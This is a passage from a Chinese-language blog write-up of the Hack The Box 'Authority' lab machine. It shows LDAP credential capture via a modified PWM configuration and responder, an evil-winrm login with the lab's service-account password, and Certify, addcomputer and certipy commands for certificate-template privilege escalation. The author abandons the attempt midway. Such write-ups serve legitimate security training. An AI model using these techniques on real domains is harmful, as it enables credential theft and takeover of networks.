<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5017 ERROR_DIRECTORY_UNAVAILABLE (all ldap profiles are unreachable; errors: [&quot;error connecting as proxy user: unable to create connection: unable to connect to any configured ldap url, last error: unable to bind to ldaps://authority.authority.htb:636 as CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb reason: CommunicationException (authority.authority.htb:636; PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target)&quot;])</span><br></pre></td></tr></table></figure>

<p>还有另外两个按钮，看一下，</p>
<p>输入配置密码，将破解的三个密码尝试一遍，有一个可以进去</p>
<p><img src="/../../../Typora/img111/image-20231006202924907.png"></p>
<p><img src="/../../../Typora/img111/image-20231006204600329.png"></p>
<p>尝试下载配置文件，也即是<code>C:\pwm\PwmConfiguration.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">ENC-PW:Qm7iticx/U/UOgOIx+wNurnrXF0xAyjb5RezCoVEP7q3EKPSzF6dVdLawidz6Ym/TYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=</span><br><span class="line"><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs</span><br><span class="line"><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>ldaps://authority.authority.htb:636<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">setting</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">setting</span> <span class="attr">key</span>=<span class="string">&quot;ldap.profile.displayName&quot;</span> <span class="attr">profile</span>=<span class="string">&quot;default&quot;</span> <span class="attr">syntax</span>=<span class="string">&quot;LOCALIZED_</span></span></span><br></pre></td></tr></table></figure>

<p>关于这个ldap连接的是这个，<code>ldaps://authority.authority.htb:636</code></p>
<p>这里的利用方式是，自己搭建一个ldap服务器，将这里的链接改为自己的</p>
<p><img src="/../../../Typora/img111/image-20231006210823079.png"></p>
<p>然后终端</p>
<p><code>responder -I tun0 </code> 启动</p>
<p>将修改的配置，上传过去</p>
<p>有时候报错，刷新一下，重新import</p>
<p>注意，这里上传成功会回到登录界面，然后responder，会监听到明文的用户名和密码嘞</p>
<p>(但我这里没有)</p>
<p>我不管，看wp，我直接下一步了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.222 --user svc_ldap --password &#x27;lDaP_1n_th3_cle4r!&#x27;</span><br><span class="line"></span><br><span class="line">└─# evil-winrm -i 10.10.11.222 --user svc_ldap --password &#x27;lDaP_1n_th3_cle4r!&#x27;</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.4</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                         </span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                           </span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt; whoami</span><br><span class="line">htb\svc_ldap</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt; hostname</span><br><span class="line">authority</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt; whoami .priv</span><br><span class="line">whoami.exe : ERROR: Invalid argument/option - &#x27;.priv&#x27;.</span><br><span class="line">    + CategoryInfo          : NotSpecified: (ERROR: Invalid ...tion - &#x27;.priv&#x27;.:String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">Type &quot;WHOAMI /?&quot; for usage.^[[A^[[*Evil-WinRMwhoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_ldap\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_ldap&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        4/23/2023   6:16 PM                Certs</span><br><span class="line">d-----        3/28/2023   1:59 PM                Department Shares</span><br><span class="line">d-----        3/17/2023   9:20 AM                Development</span><br><span class="line">d-----         8/9/2022   7:00 PM                inetpub</span><br><span class="line">d-----        3/24/2023   8:22 PM                PerfLogs</span><br><span class="line">d-r---        3/25/2023   1:20 AM                Program Files</span><br><span class="line">d-----        3/25/2023   1:19 AM                Program Files (x86)</span><br><span class="line">d-----        10/6/2023   2:04 PM                pwm</span><br><span class="line">d-r---        3/24/2023  11:27 PM                Users</span><br><span class="line">d-----        7/12/2023   1:19 PM                Windows</span><br><span class="line">-a----        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是真折磨啊，老是断开</p>
<p>大佬说发现了Certs文件夹了，说明可以用以下命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /vulnerable</span><br></pre></td></tr></table></figure>

<p>我试不出来，直接看wp</p>
<p>找到了一个漏洞的证书模板，可以获得管理员权限，可以充分使用ECS1 privilege escalation</p>
<p>使用<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/addcomputer.py">impacket-addcomputer.py</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 impacket-addcomputer.py -dc-ip 10.10.11.222 -computer-name malicious_PC -computer-pass Password123  &#x27;htb.local/svc_ldap:lDaP_1n_th3_cle4r!&#x27;</span><br></pre></td></tr></table></figure>

<p>然后需要请求一个证书来模拟管理员用户，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad req  -username &quot;malicious_PC$&quot; -p &quot;Password123&quot; -template CorpVPN  -dc-ip 10.10.11.222 -ca AUTHORITY-CA -upn &#x27;Administrator@authority.htb&#x27;</span><br></pre></td></tr></table></figure>

<p>不行，我不搞了，太懵了，不做了</p>
<h3 id="root-6"><a href="#root-6" class="headerlink" title="root"></a>root</h3><h3 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h3><p><code>smbmap</code>，允许用户枚举整个域中的samba共享驱动器。用户可以使用该工具列出共享驱动器、驱动器权限、共享内容、上传&#x2F;下载功能、文件名自动下载模式匹配，甚至远程执行命令。该工具原本的设计初衷是为了简化在大型网络中搜索潜在敏感数据的过程</p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@Char0n_0x04/authority-htb-694f0c8bdad6">https://medium.com/@Char0n_0x04/authority-htb-694f0c8bdad6</a></p>
<p><a target="_blank" rel="noopener" href="https://cyb3rc4t.hashnode.dev/authority">https://cyb3rc4t.hashnode.dev/authority</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/06/18/hack-the-box/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/" rel="tag">kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2023/06/25/%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            系统日志
          
        </div>
      </a>
    
    
      <a href="/2023/06/13/Web%E5%AE%89%E5%85%A8%E6%A0%B8%E5%BF%83%E9%97%AE%E9%A2%98/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">Web安全防护体系</div>
      </a>
    
  </nav>

  
   
<div class="gitalk" id="gitalk-container"></div>

<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">


<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>


<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>

<script type="text/javascript">
  var gitalk = new Gitalk({
    clientID: '93da8388ad1469a8be66',
    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
    repo: 'blogtalk',
    owner: 'ak005469075',
    admin: ['ak005469075'],
    // id: location.pathname,      // Ensure uniqueness and length less than 50
    id: md5(location.pathname),
    distractionFreeMode: false,  // Facebook-like distraction free mode
    pagerDirection: 'last'
  })

  gitalk.render('gitalk-container')
</script>

  
    
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023
        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>

<script src="/js/clickBoom1.js"></script>
 
<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>